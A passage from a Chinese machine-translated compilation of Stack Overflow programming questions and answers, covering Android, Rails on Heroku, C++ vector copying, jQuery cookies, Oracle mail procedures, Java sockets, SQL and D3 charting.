更好的方法需要您覆盖 TextView 类。您可以使用剪辑来拆分 TextView 并以不同的颜色绘制两个部分。

```
TextView tv = new TextView(this){
    @Override
    public void draw(Canvas canvas) {
        int color1 = Color.WHITE;
        int color2 = Color.GREEN;

        canvas.save();
        setTextColor(color1);
        setBackgroundColor(color2);
        canvas.clipRect(new Rect(0, 0, (int)(getWidth() * percent), getHeight()));
        super.draw(canvas);
        canvas.restore();

        canvas.save();
        setTextColor(color2);
        setBackgroundColor(color1);
        canvas.clipRect(new Rect((int)(getWidth() * percent), 0, getWidth(), getHeight()));
        super.draw(canvas);
        canvas.restore();
    }  
}; 
```

我希望你明白这一点

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2016-04-11T00:04:15.737

我知道这是一个老问题，但我发布这个问题是因为它可能会帮助其他人寻找类似的情况，希望它会帮助现在经历这个问题的人。这是一个例子

![1](../Images/c05702c975033520fa115565b815c2a8.png) ![2](../Images/588d8fbfe42a72e7d6c00050b730cf5a.png) ![3](../Images/9924d2540ed5df4a037dc26e1dc6c7f2.png)

我的解决方案基本上是使用`drawText`. 这里的技巧是您绘制两个文本，一个在条形边界内，一个在视图边界内，并使用以下 Z-index 顺序（根据使用的示例）：

*   文字（白色）
*   红条
*   文字（黑色）
*   查看背景

我已经做了一个关于如何实现这个的例子，在这个示例/库中，我使用了一个自定义的 imageview 来做到这一点。随意使用它，因为你喜欢它：[https ://github.com/danilodanicomendes/InvertedTextProgressBar](https://github.com/danilodanicomendes/InvertedTextProgressBar)

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2013-02-20T10:54:03.623

最简单的解决方案是在相对布局上使用 ProgressBar 和 TextView。您为两者提供自己的风格，仅此而已。当 ProgressBar 拥有您所需要的一切时，尝试在 TextView 上执行此操作是没有意义的。您的布局将如下所示：

```
<RelativeLayout android:layout_width="match_parent"
        android:layout_height="wrap_content">

        <ProgressBar android:layout_width="match_parent"
            android:layout_height="wrap_content"
            android:layout_centerVertical="true"/>

        <TextView android:layout_width="match_parent"
            android:layout_height="wrap_content"
            android:text="Doing something"
            android:gravity="center"
            android:layout_centerVertical="true"/>          
</RelativeLayout> 
```

您只需要根据需要使用宽度和高度:)

# android - onOptionsItemSelected 语法错误

> ID：14977627
> 
> 赞同：0
> 
> 时间：2013-02-20T10:31:57.970
> 
> 标签：android, menu, android-actionbar

我在为操作栏菜单设置响应程序时遇到问题。

我正在使用这段代码，Eclipse 一直告诉我 "Syntax error on token" 。”，删除此令牌”和“方法 startActiviy(intent) 未定义为 MainActivity 类型”

这是我的代码：

```
public boolean onOptionsItemSelected (MenuItem item) {
        switch (item.getItemId()) {
        case.R.Id.about:
            startActivity (new Intent (this, einstellungen.class));
            return true;

            default:
                return super.onOptionsItemSelected(item);
        }

        return true;

    } 
```

有人有想法吗？

提前致谢！

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-02-20T10:35:09.227

就是这一行：

```
case.R.Id.about: 
```

它应该是：

```
case R.Id.about: 
```

# ruby-on-rails - 在哪里将图像保存在heroku中以便在rails应用程序的csv中使用它？

> ID：14977631
> 
> 赞同：0
> 
> 时间：2013-02-20T10:32:12.800
> 
> 标签：ruby-on-rails, ruby-on-rails-3, heroku, paperclip

我有一个 csv 文件要导入到 heroku 中的数据库，并且 csv 包含图像名称，我必须将图像放在一个文件夹中并在导入代码中指定其路径。所以我尝试将图像保存在公用文件夹和资产文件夹中，它返回错误如下

```
Errno::ENOENT (No such file or directory - /images/picture17.jpg): 
```

我什至在 production.rb 中设置为 true 如下

```
 config.serve_static_assets = true 
```

但我仍然得到错误。请帮我。

编辑：

```
csv_text = File.read('sample.csv')
        csv = CSV.parse(csv_text, :headers => true)
        csv.each do |row|
            Model.create!({"name"=>row['name'], "age"=>row['age'], "pic"=>File.open("/images" + row['pic_name'])})
        end 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-02-20T11:34:40.130

当使用免费计划时，Heroku 会每隔一段时间删除您的 public/assets 目录

（我想每天一次。）因此，您应该通过自 3.1+ 以来已集成在 Rails 中的资产管道提供资产

尽管您提到您正在导入一个 CSV 文件，这让我猜想实际上有一个为此应用程序设置的数据库。

让我向您介绍 CarrierWave 结合 Cloudinary 的甜蜜生活。

花时间阅读 CarrierWave 文档：[https ://github.com/jnicklas/carrierwave](https://github.com/jnicklas/carrierwave)

Cloudinary 文档：[http ://cloudinary.com/documentation](http://cloudinary.com/documentation)

好的部分来了：Heroku 实际上与 cloudinary 集成得非常简洁[https://addons.heroku.com/cloudinary](https://addons.heroku.com/cloudinary)

只需在您的上传器中包含 Cloudinary::CarrierWave 标头，这应该可以解决问题！

# c++ - 复制 std::vector：更喜欢赋值还是 std::copy？

> ID：14977632
> 
> 赞同：76
> 
> 时间：2013-02-20T10:32:13.880
> 
> 标签：c++, stl, copy

我有两个向量：

```
std::vector<int> v1, v2;

// Filling v1
... 
```

现在我需要复制`v1`到`v2`. 有没有更喜欢的理由

`v2 = v1;`

到

`std::copy (v1.begin(), v1.end(), v2.begin());`

（或相反亦然）？

* * *

## 回答 #1

> 赞同：93
> 
> 时间：2013-02-20T10:37:18.157

一般来说，我强烈希望`v2 = v1`：

1.  它更短，使意图更清晰
2.  `std::copy`如果`v2`没有相同的长度`v1`（它不会调整它的大小，因此它将保留一些旧元素最好的情况（`v2.size() > v1.size()`并覆盖程序中其他地方使用的一些随机数据最坏的情况）
3.  如果`v1`即将过期（并且您使用 C++11），您可以轻松地将其修改为`move`内容
4.  性能分配不太可能会变慢，因为如果它提供了性能优势，`std::copy`实现者可能会在内部使用。`std::copy`

总之，`std::copy`表达力较差，可能会做错事，甚至不会更快。所以没有任何理由在这里使用它。

* * *

## 回答 #2

> 赞同：14
> 
> 时间：2013-02-20T10:40:14.923

如果`v2`不够大，如果`copy`按原样使用，则会出现缓冲区溢出。

您可以使用将调用 push_back on 的后插入迭代器`v2`。但是，这可能会导致多次重新分配，具体取决于大小`v1`。

```
copy(v1.begin(), v1.end(), back_inserter(v2)); 
```

你最好让`vector`正确地管理事情。赋值运算符执行此操作，如下所示`vector::assign`：

```
v2.assign(v1.begin(), v1.end()); 
```

我有一个暗示，赋值运算符是根据`vector::assign`.

* * *

## 回答 #3

> 赞同：12
> 
> 时间：2013-02-20T10:35:56.493

的调用`std::copy`可能会尝试访问超出目标向量末尾的项目。

使用赋值。

微优化不是你的工作：这是库编写者的责任，最终也是编译器的责任。

如果不必正确，您可以*任意快速地编写代码。*

`copy`然而，在.

* * *

## 回答 #4

> 赞同：2
> 
> 时间：2013-02-20T10:35:22.363

它更短。

`std::copy`主要用于复制容器的部分。如果需要复制整个容器，不妨使用复制构造函数。

* * *

## 回答 #5

> 赞同：2
> 
> 时间：2013-02-20T10:36:44.447

任务，到目前为止。更一般地，任何时候向量的大小可能会改变，或者改变向量的全部内容，你应该更喜欢成员函数。唯一`std::copy`合适的时间是，如果您只是完全替换向量内的一个小范围。

* * *

## 回答 #6

> 赞同：1
> 
> 时间：2013-02-20T10:46:41.530

分配更清晰，内部使用`std::copy`（或`unitizalized_copy` `_M_allocate_and_copy`取决于大小和容量）或性能相同。

# php - 重新加载文档时会重置 Jquery 函数

> ID：14977634
> 
> 赞同：-1
> 
> 时间：2013-02-20T10:32:14.940
> 
> 标签：php, javascript, jquery, html

每当我放置我的 jquery 导航功能的页面刷新时，它都会重置 jquery 功能，使我的导航框在我点击它时隐藏而不是显示。有人告诉我，我应该使用 javascript cookie..，我对此不太了解。

这是我的jQuery代码

```
<script type="text/javascript">

    $(document).ready(function(){
        $(".about").on("click",function(){              
            $(".nav").show();
            $(".menu1 li a").show();
            $(".menu2 li a").hide();
            $(".menu3 li a").hide();
            $(".menu4 li a").hide();
        });

        $(".cord").on("click",function(){
            $(".menu1 li a").hide();
            $(".menu3 li a").hide();
            $(".menu4 li a").hide();
            $(".nav").show();
            $(".menu2 li a").show();
        })

</script> 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-02-20T11:08:08.390

首先下载[**jQuery.Cookies**](https://github.com/carhartl/jquery-cookie)。

如下使用它。

`Javascript`文件如下使用它。

```
<script type="text/javascript">

    $(document).ready(function ()
    {
        var checkCookie = $.cookie("nav-item");
        if (checkCookie != "")
        {
            $('#nav > li > a:eq('+checkCookie+')').next().show();
        }
        $('#nav > li > a').click(function()
        {
            var navIndex = $('#nav > li > a').index(this);
            $.cookie("nav-item", navIndex);
            $('#nav li ul').slideUp();
            if ($(this).next().is(":visible"))
            {
                $(this).next().slideUp();
            }
            else
            {
                $(this).next().slideToggle();
            }
            $('#nav li a').removeClass('active');
            $(this).addClass('active');
        });
    });

</script>
```

我只是解释如何做到这一点。

有更多更好的方法来使用它。

[**更多帮助**](http://www.flipflops.org/2008/01/19/a-simple-jquery-menu-with-persistence-using-cookies/)

# jquery - Fancybox 2 的手动调用返回“递归过多”错误

> ID：14977641
> 
> 赞同：0
> 
> 时间：2013-02-20T10:32:35.963
> 
> 标签：jquery, recursion, fancybox, fancybox-2

我刚刚在我的网站上安装了 Fancybox 2，我正在尝试手动调用它（通过单击图像）。我得到的错误是“递归过多”。我会尽量提供尽可能多的信息，因为该项目只是本地的。

以下是按正确顺序为给定页面加载的 javascript 文件列表：

*   /js/jquery.js
*   /js/bootstrap.min.js
*   /js/leaflet.js
*   /js/jquery.cloud.min.js
*   /js/jquery.cookie.js
*   /js/jquery.fancybox.min.js

这是代码（我认为这很简单）：

```
function viewImages () { 
    $.fancybox( {href : '223141main_flare_print.gif', title : 'Lorem lipsum'} ); 
}

$('div.image').click(function(){ viewImages (); }); 
```

最后，这些是我在单击 div 时遇到的确切错误：

> 太多递归@ ../js/jquery.js:1534
> 
> 太多递归@ ../js/jquery.js:2777

任何帮助将不胜感激。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-14T16:51:38.457

如果您使用的是 Twitter Bootstrap < 2.3.1，则已知会导致这个确切的问题（我刚刚经历过，升级 bootstrap 解决了这个问题）

更多细节在这里：[https ://github.com/fancyapps/fancyBox/issues/519](https://github.com/fancyapps/fancyBox/issues/519)

# java - 奇怪的排序行为

> ID：14977642
> 
> 赞同：2
> 
> 时间：2013-02-20T10:32:37.920
> 
> 标签：java

```
int[] a = new int[] {7,2,1,10,8,9};
int[] b = a;
Arrays.sort(b); 
```

为什么在 b 上的排序操作之后两个数组都得到排序。不应该只有 b 得到排序吗？

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2013-02-20T10:33:25.420

因为它只有一个数组。“a”和“b”只是对同一个数组的引用。

如果您使用 clone 方法来复制值，那么 a 和 b 将是不同的数组，只有 b 会被排序。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-02-20T10:34:23.673

因为`a`and`b`是对同一个数组的引用。当你这样做

```
int[] b = a; 
```

你不是在复制你的数组，你只是在复制对同一个数组的引用。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-02-20T10:33:41.057

两者都`b`指向`a`同一个数组对象。所以它们都是同一个数组。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2013-02-20T10:33:55.620

因为将 a 分配给 b 只会分配对数组的引用。内存中只有一个数组，因此无论您从何处访问它，更改它都会改变它。

# oracle - Zend_Db - 在获取或执行和获取之前定义未完成

> ID：14977644
> 
> 赞同：0
> 
> 时间：2013-02-20T10:32:45.207
> 
> 标签：oracle, zend-framework, zend-db, bind-variables

我在 Oracle 中有一个 send_mail() 过程来处理所有的电子邮件。

我可以从 Zend 查询中调用该过程而没有错误`$db->query("blah blah");`，但是当我使用 a 时，`$stmt = $db->prepare("blah blah");`我得到了错误（尽管电子邮件仍然发送）：

`24374 ORA-24374: define not done before fetch or execute and fetch *begin send_mail(:mailto,:mailhost,:mailport,:mailfrom,:subject,:message); end;","file":"C:\\wamp\\www\\sam\\library\\Zend\\Db\\Statement\\Oracle.php`

我所有的变量都定义了吗？所以不确定是什么导致了这个错误？

我的代码：

```
$db = Zend_Registry::get('db');

            $emailTo = trim($_POST['emailto']);
            $subject = trim($_POST['subject']);
            $message = trim($_POST['msg']);

        $eSettings = $db->query("Select MAIL_HOST, MAIL_PORT, MAIL_FROM from     PI_SETTINGS_TABLE")->FetchAll();

            $stmt = $db->prepare("begin send_mail(:mailto,:mailhost,:mailport,:mailfrom,:subject,:message); end;");
            $stmt->bindParam('mailto', $emailTo);
            $stmt->bindParam('mailhost', $eSettings[0]['MAIL_HOST']);
            $stmt->bindParam('mailport', $eSettings[0]['MAIL_PORT']);
            $stmt->bindParam('mailfrom', $eSettings[0]['MAIL_FROM']);
            $stmt->bindParam('subject', $subject);
            $stmt->bindParam('message', $message);
            $stmt->execute();
            $checkQuery = $stmt->FetchAll(); 
```

也许有人可以阐明为什么我可以将其作为查询而不是作为绑定语句传递？

我的 SEND_MAIL 程序：

```
create or replace
PROCEDURE "SEND_MAIL" (
msg_to varchar2,
mail_host varchar2,
mail_port varchar2,
msg_from varchar2,
msg_subject varchar2,
msg_text varchar2 )
IS
c utl_smtp.connection;
rc integer;

BEGIN
c := utl_smtp.open_connection(mail_host, mail_port); -- SMTP on port 25
utl_smtp.helo(c, mail_host);
utl_smtp.mail(c, msg_from);
utl_smtp.rcpt(c, msg_to);

utl_smtp.data(c,'From: ' || msg_from || utl_tcp.crlf ||
'To: ' || msg_to || utl_tcp.crlf ||
'Subject: ' || msg_subject ||
utl_tcp.crlf || utl_tcp.crlf || msg_text);
utl_smtp.quit(c);

EXCEPTION
WHEN UTL_SMTP.INVALID_OPERATION THEN
dbms_output.put_line(' Invalid Operation in Mail attempt
using UTL_SMTP.');
WHEN UTL_SMTP.TRANSIENT_ERROR THEN
dbms_output.put_line(' Temporary e-mail issue - try again');
WHEN UTL_SMTP.PERMANENT_ERROR THEN
dbms_output.put_line(' Permanent Error Encountered.');
END; 
```

注意：当我使用绑定变量从 SQL Developer 运行查询时，我收到此错误并且电子邮件未发送：

```
ORA-06502: PL/SQL: numeric or value error: character to number conversion error
ORA-06512: at "PI_USER_ADMIN.SEND_MAIL", line 15 
```

但是它会用zend发送吗？

最亲切的问候

弥敦道

# java - Install4j - 批量更新

> ID：14977650
> 
> 赞同：0
> 
> 时间：2013-02-20T10:33:08.277
> 
> 标签：java, updates, auto-update, updating, install4j

默认情况下，install4j 自动更新功能允许一个接一个地下载更新。我希望用户能够在后台下载所有可用更新，并在下载完成后*一步批量安装所有更新。*

install4j 是否提供此功能？我怎么能做到？

提前感谢您的回答。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-02-21T20:48:56.250

不，install4j 不支持开箱即用的此功能。install4j 假定更新安装程序是完整的安装程序，因此最新的安装程序就足够了。

您描述的是补丁安装程序，但这不是 install4j 中可用的概念。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-02-25T14:34:17.063

我有一个没有批量更新功能的部分解决方案。每个安装程序（主程序和补丁）都应该检查下一个更新，下载它并在安装过程完成后启动。您可以复制默认的更新程序操作来实现这一点。因此，所有更新都将按顺序下载。启用未达到模式后，最新版本的安装对用户来说是完全透明的。此外，您可能有单独的更新程序可执行文件和静默版本检查，以从 java 代码启动此过程。

# visual-studio-2010 - 如何解决错误的“EF Power Tools：modelEntityContainerName 包含无效字符”？

> ID：14977652
> 
> 赞同：1
> 
> 时间：2013-02-20T10:33:11.890
> 
> 标签：visual-studio-2010, entity-framework, sql-server-ce, entity-framework-5, sql-server-ce-4

我面临许多人已经面临的问题，但有所不同：SDF 文件名或路径均不包含无效字符。我什至尝试过使用 Northwind.sdf 文件，而 Ikeep 也遇到了同样的问题。

完整路径示例：D:\Sviluppo\dotnet\EnergiaClima\EnergiaClimaWindows\App_Data\Northwind.sdf

错误信息：

```
System.ArgumentException: The modelEntityContainerName parameter 'D:\Sviluppo\dotnet\EnergiaClima\EnergiaClimaWindows\App_Data\NorthwindsdfContext' contains characters that are not valid.
   at System.Data.Entity.Design.EntityModelSchemaGenerator..ctor(EntityContainer storeEntityContainer, String namespaceName, String modelEntityContainerName)
   at Microsoft.DbContextPackage.Handlers.ReverseEngineerCodeFirstHandler.ReverseEngineerCodeFirst(Project project) 
```

这个问题让我发疯：EF Power Tools Beta 3 真的可以在 VS2010 中运行吗？如果不是，从 SQLCE4.0 DB 获取实体模型的最佳（和更简单）方法是什么（如果可能的话，不是创建 3.5 DB 和编辑 XML 文件的方法）？

我不明白为什么 SQLCE4.0 支持这么差。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-09T19:58:09.637

现在这是一个经过验证的问题：[http ://entityframework.codeplex.com/workitem/898](http://entityframework.codeplex.com/workitem/898)

我想知道这些人是如何测试他们的库的：他们是否曾尝试将 EF5 Code First 与 SQL CE 数据库一起使用？

无论如何，希望它会在 EF6 中得到解决。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2014-05-05T20:08:41.057

这仍然发生在现有的基于文件的数据库上。这将在 Sql Server Compact 和 LocalDb 中发生。它与服务器实例下的数据库名称有关。如果您在通过代码连接到同一个数据库之前尝试直接从“逆向工程师代码优先”连接对话框连接到原始 .mdf / .sdf，则数据库引擎会将数据库加载到名称等于db 的完整路径，因为没有地方命名数据库（初始目录）并且必须命名数据库才能将其加载到 sql server 实例。然后，当 EF Reverse Engineer Code First 尝试创建上下文时，它会阻塞 DBName 中存在的反斜杠（可能还有冒号）。{注意：如果您在针对数据库连接字符串发布了一些代码之后进行连接，

快速简便的解决方案是：

1) 关闭 Visual Studio 以终止与数据库的连接。

2) 启动 SQL Server Management Studio 并连接到 "(localDB)\v11.0" {注意这是 localDB 实例，我不知道紧凑型数据库实例是什么。

3) 右键单击​​数据库名称并选择重命名以将数据库重命名为所需的初始目录名称，而不是完整的文件名路径名。

也许 EF 逆向工程师代码优先工具应该评估 DBName 并且只使用最后一个斜杠减去 DBContext 的文件扩展名的所有内容？特别是因为大多数连接字符串将初始目录定义为与文件名相同的名称。

希望这可以帮助某人。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-02-20T13:39:18.803

假设您想从 SQL Server Compact 文件创建 edmx，您可以使用我的 SQL Server Compact Toolbox 扩展从任何 3.5 或 4.0 文件创建 edmx。

# iphone - 即使使用自动布局，在 4 英寸屏幕上创建的布局在 3.5 英寸屏幕上也会变得混乱

> ID：14977662
> 
> 赞同：2
> 
> 时间：2013-02-20T10:33:34.467
> 
> 标签：iphone, ios, layout, ios6, autolayout

我有一个简单的登录屏幕。它在 4 英寸屏幕上看起来不错。

![在此处输入图像描述](../Images/8068d5d270b3634d002d371d0514b5dd.png)

但是当我在 3.5 英寸的屏幕上运行它时，你可以看到底部被切断了。

![在此处输入图像描述](../Images/fb2e62b3977f42caab6dcd2123f183d7.png)

我打开了自动布局，下面是设置的约束。

![在此处输入图像描述](../Images/85078bb81e73426cd99cf53de1c31f14.png)

如果我可以进一步解释一下，我有 4 个 UITextFields。第一个（用户 ID）对齐为中心 Y 对齐。并且彼此下方的每个 UITextField 都设置了垂直空间约束。对于按钮，垂直空间也是使用上面的 UITextField 设置的（服务器）。我知道这是导致问题的约束。但是如果我删除它并向 SuperView 约束添加一个底部空间，则该按钮将与最后一个 UITextField 重叠。

我已经在 RW 上浏览了 Auto Layout 教程的两个部分。我仍然不知道如何纠正这个问题。如何使此布局在两种屏幕尺寸下都正确显示？

谢谢你。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-02-20T23:53:43.090

简单的解决方案是将所有东西固定在顶部，确保它适合 3.5 英寸的屏幕。随着屏幕的扩大，底部会有额外的空间。

更好的选择是在两个屏幕上均匀地垂直排列元素，但这不能纯粹在界面构建器中完成。您需要在代码中计算垂直间距并将它们应用于`updateViewConstraints`

# java - Java Sockets - 将文件从客户端发送到服务器

> ID：14977663
> 
> 赞同：6
> 
> 时间：2013-02-20T10:33:34.530
> 
> 标签：java, file, sockets, client

我已经看到很多将文件从服务器发送到客户端的示例。例如（在[这里](http://www.java2s.com/Code/Java/Network-Protocol/TransferafileviaSocket.htm)找到）：

服务器：

```
import java.io.BufferedInputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.IOException;
import java.io.OutputStream;
import java.net.ServerSocket;
import java.net.Socket;

public class Main {
  public static void main(String[] args) throws IOException {
    ServerSocket servsock = new ServerSocket(123456);
    File myFile = new File("s.pdf");
    while (true) {
      Socket sock = servsock.accept();
      byte[] mybytearray = new byte[(int) myFile.length()];
      BufferedInputStream bis = new BufferedInputStream(new FileInputStream(myFile));
      bis.read(mybytearray, 0, mybytearray.length);
      OutputStream os = sock.getOutputStream();
      os.write(mybytearray, 0, mybytearray.length);
      os.flush();
      sock.close();
    }
  }
} 
```

客户：

```
import java.io.BufferedOutputStream;
import java.io.FileOutputStream;
import java.io.InputStream;
import java.net.Socket;

public class Main {
  public static void main(String[] argv) throws Exception {
    Socket sock = new Socket("127.0.0.1", 123456);
    byte[] mybytearray = new byte[1024];
    InputStream is = sock.getInputStream();
    FileOutputStream fos = new FileOutputStream("s.pdf");
    BufferedOutputStream bos = new BufferedOutputStream(fos);
    int bytesRead = is.read(mybytearray, 0, mybytearray.length);
    bos.write(mybytearray, 0, bytesRead);
    bos.close();
    sock.close();
  }
} 
```

有没有办法重写这个或类似的东西，以相反的方式使用，以便客户端可以将文件发送到服务器？

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2013-02-20T10:38:07.390

是的，这是可以做到的。对于客户端，您将在本地读取文件并写入服务器的输出流，而不是从服务器请求文件。在服务器端，您将接受新连接，并从服务器 Inpustream 读取客户端发送的内容。

# java - 从Android应用程序中的表中删除一行比较其他表

> ID：14977665
> 
> 赞同：1
> 
> 时间：2013-02-20T10:33:35.870
> 
> 标签：java, android, database

我有两张桌子A和B

```
A has aid, bid, aname columns
B has bid, bname columns 
```

我想从 A 中删除一行

IE`delete from A where bid = (select bid from b where bname like '%Mass%' )`

如何在 Android 中编写查询。

我可以做的一件事是`select bid from b where bname like '%Mass%'`单独执行并将 id 存储在变量中并运行类数据库的删除方法。

有没有其他简单的方法。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-02-20T10:45:14.900

```
DELETE FROM A WHERE bid IN (SELECT bid FROM B WHERE bname LIKE '%Mass%') 
```

# cuda - cuda 分析器 l1_global_load_hit 和 l1_global_load_miss 返回零

> ID：14977667
> 
> 赞同：1
> 
> 时间：2013-02-20T10:33:39.770
> 
> 标签：cuda, profiler

我目前正在使用`nvprof`. 我尝试检查未合并的内存负载：

```
nvprof --events l1_global_load_hit myapplication 
```

返回：

```
 1         0         0         0  l1_global_load_hit 
```

和：

```
nvprof --events l1_global_load_miss myapplication 
```

返回

```
1         0         0         0  l1_global_load_miss 
```

. 有谁知道为什么我没有得到任何负载？我的内核中肯定有负载。

```
nvprof --events gld_request myapplication 
```

返回：

```
 1515884425251588442525158844252  gld_request 
```

感谢您的帮助！

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2016-02-08T22:32:41.417

对于 Kepler 微架构 GPU（计算能力 3.x），默认全局内存负载[不缓存在 L1 中](http://docs.nvidia.com/cuda/cuda-c-programming-guide/#global-memory-3-0)。

# android - 在某些 Android 设备上，状态栏图标看起来很奇怪

> ID：14977672
> 
> 赞同：0
> 
> 时间：2013-02-20T10:33:49.573
> 
> 标签：android, icons, statusbar

我目前正在为 Android 设备开发一个应用程序，该应用程序在后台运行并有时会推送通知。推送通知时，状态栏中会弹出一个图标。问题是在某些设备上它看起来太大并且被剪裁，但在其他设备上看起来很好。例如，当我在我的个人设备 Samsung Galaxy S3 android 4.2.2 和运行 android 2.2 的虚拟设备上测试应用程序时，它看起来还不错。但是当我在 LG E400f - L Style android 2.3.6 上测试该应用程序时，它看起来像这样： ![它在 LG E400f 上的外观 - L 风格](../Images/04733a7de07c14b72569fffd710c46a1.png)

任何人都知道为什么会这样？提前致谢！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-02-20T10:39:49.740

您需要为每个平台提供正确大小的图标。文档在[这里](https://developer.android.com/guide/practices/ui_guidelines/icon_design_status_bar.html)。

# powershell - 使用计划的 powershell 任务运行远程脚本超时

> ID：14977673
> 
> 赞同：0
> 
> 时间：2013-02-20T10:33:50.197
> 
> 标签：powershell

我需要访问位于“ [http://site.com/script.aspx](http://site.com/script.aspx) ”的导入脚本，并且我目前已经设置了一个 powershell 脚本来执行此操作，问题是脚本可能需要 10 分钟才能完成，这会导致GetResponse to tiemout with : "GetResponse" with "0" argument(s): "The operation has timed out"

```
$global:url= "http://site.com/script.aspx"
#$myHttpWebRequest = [system.net.WebRequest]::Create($url)
#$myHttpWebRequest.Timeout = 600000 # dosent seem to do whats needed
#$myHttpWebResponse = $myHttpWebRequest.GetResponse() 
```

我该如何解决这个问题？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-02-20T16:51:27.987

如果我没看错，PowerShell 脚本正在发出一个`script.aspx`运行 10 分钟的请求，此时 Web 请求会引发异常，指出请求已达到超时限制并已终止？

如果是这样，这不是 PowerShell 可以控制的。这（可能）由服务器上的设置控制`site.com`。我将从查看该页面的`web.config`文件开始。`script.aspx`

```
<configuration>
  <system.web>
    <!-- increase timeout to 15 minutes -->
    <httpRuntime executionTimeout="900" />
  </system.web>
</configuration> 
```

参考：http: [//msdn.microsoft.com/en-us/library/e1f13641%28v=vs.100%29.aspx](http://msdn.microsoft.com/en-us/library/e1f13641%28v=vs.100%29.aspx)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-02-21T08:51:18.403

我放弃了使用 powershell，而是从批处理文件中运行 wget。

# sql - 我如何在我的 SQL 语句中执行此操作

> ID：14977675
> 
> 赞同：0
> 
> 时间：2013-02-20T10:33:54.970
> 
> 标签：sql

我有一个关于 SQL 语句的问题。

此 SQL 语句工作正常，但我也想找到 0 中的餐馆`Restarurant_ID`。我怎样才能在这个声明中做到这一点？

```
SELECT ct.*, t.*
FROM exp_channel_titles AS ct
LEFT JOIN transactions AS t ON (ct.entry_id = t.restaurant_id)
WHERE t.cardid > 0
ORDER BY t.created DESC 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-02-20T10:36:09.367

你可以这样做

```
WHERE t.cardid > 0 OR t.restaurant_id=0 
```

如果 cardid 不强制大于 0 ，您也可以使用 AND 确保`t.cardid`也大于 0

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-02-20T10:36:06.247

添加`AND restaurant_id = 0`到你的 where 子句

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2013-02-20T10:37:39.320

在 PHP 中：

```
 <?php

        $result = mysql_query("SELECT
         ct.*, t.*
         FROM
         exp_channel_titles as ct
         LEFT JOIN
         transactions as t on (ct.entry_id = t.restaurant_id)
         WHERE
         t.cardid > 0 and t.restaurant_id=0
         order by t.created DESC");

        while($row = mysql_fetch_array($result)){
          echo $row['field'];
        }

    ?> 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2013-02-20T10:35:52.427

```
SELECT
ct.*, t.*
FROM
exp_channel_titles as ct
LEFT JOIN
transactions as t on (ct.entry_id = t.restaurant_id)
WHERE
t.cardid > 0 and t.restaurant_id=0
order by t.created DESC 
```

# javascript - 如何使用 D3.js 获取 Javascript 对象数组，并在折线图中使用它们？

> ID：14977678
> 
> 赞同：5
> 
> 时间：2013-02-20T10:33:57.083
> 
> 标签：javascript, d3.js

我正在处理的 Web 应用程序有一个 REST 接口，它返回和对象数组类似：

```
[{"id":110, "time":1360580745797, "userName":"pinky", "activity":"respawn"},
{"id":111, "time":1360580745797, "userName":"perky", "activity":"change direction"},
{"id":112, "time":1360580745797, "userName":"clyde", "activity":"caught pacman"},
{"id":113, "time":1360580745797, "userName":"perky", "activity":"respawn"},
{"id":114, "time":1360580745797, "userName":"perky", "activity":"caught pacman"},
{"id":115, "time":1360580745797, "userName":"clyde", "activity":"respawn"}] 
```

我想使用这些数据来呈现一个折线图，其中每个活动都有一条线，并显示每天该活动的总和。未使用 id 并且在此阶段未使用 userName （但是我想稍后过滤用户名上的结果）。

我查看了使用 map reduce 函数对数据进行排序的方法，但此后一直在尝试使用[D3 的嵌套功能](https://github.com/mbostock/d3/wiki/Arrays#wiki-_nest)。

我目前有一些看起来有点像这样的代码：

```
d3.json(url, function(error, json) {
    if (error) return console.warn(error);

    console.log(json);

    d3.nest()
        .key(function(d) { return d.activity; })
        .key(function(d) {return d3.time.format('%x')(new Date(d.time));})
        .entries(json);

}; 
```

这会将我的 json 数据分组到一个由活动键入的对象数组中，然后依次按日期键入。接下来我需要总结当天的活动量。

尽管我不完全确定如何将我的数据转换为 d3 折线图可以使用的格式，但从这里开始。

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2013-02-26T18:04:32.573

下面是一个解决方案。您可能需要更改 d3 url，但它应该可以正常工作。

问题：如果一天没有活动，它们不会在行中显示为“0”。他们被跳过。插入零值可能会更好。

```
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8">
<title>D3 Demo: SVG with data</title>
<script type="text/javascript" src="js/d3.v3.js"></script>
<style type="text/css">

body { font: 10px sans-serif;}

.axis path,
.axis line {
  fill: none;
  stroke: #000;
  shape-rendering: crispEdges;
}

.line {
  fill: none;  stroke-width: 1.5px;
}
</style>
</head>
<body>
<script type="text/javascript">

var dataset = [{"id":110, "time":1360580745797, "userName":"pinky", "activity":"respawn"},
               {"id":111, "time":1360580745798, "userName":"perky", "activity":"change direction"},
               {"id":111, "time":1360580745799, "userName":"perky", "activity":"change direction"},
               {"id":111, "time":1360580745797, "userName":"perky", "activity":"change direction"},
               {"id":111, "time":1361580745797, "userName":"perky", "activity":"change direction"},
               {"id":111, "time":1361580745798, "userName":"perky", "activity":"change direction"},
               {"id":112, "time":1360580745797, "userName":"clyde", "activity":"caught pacman"},
               {"id":113, "time":1360580745797, "userName":"perky", "activity":"respawn"},
